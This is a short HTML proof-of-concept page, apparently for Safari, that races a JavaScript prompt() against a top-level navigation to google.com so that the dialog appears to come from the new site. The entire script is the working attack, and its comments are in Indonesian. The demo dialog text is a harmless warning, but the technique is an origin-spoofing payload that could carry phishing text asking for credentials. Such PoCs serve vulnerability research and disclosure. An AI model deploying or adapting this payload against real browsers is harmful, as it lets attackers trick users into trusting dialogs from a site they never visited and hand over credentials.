<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Safari Quick Dialog PoC</title>
</head>
<body style="background:#000;color:#fff;font-family:sans-serif;text-align:center;">
<h3>Loading…</h3>

<script>
// Langsung race dialog dengan navigation
setTimeout(() => {

  // Trigger top-level navigation
  location.href = "https://www.google.com";

  // Race prompt() tepat setelah navigation
  setTimeout(() => {
    try {
      prompt("fake.google.com\n⚠️ Do not sign into your account", "");
    } catch (e) {}
  }, 10); // 10ms after navigation

}, 100); // 100ms delay biar page settle
</script>
</body>
</html>
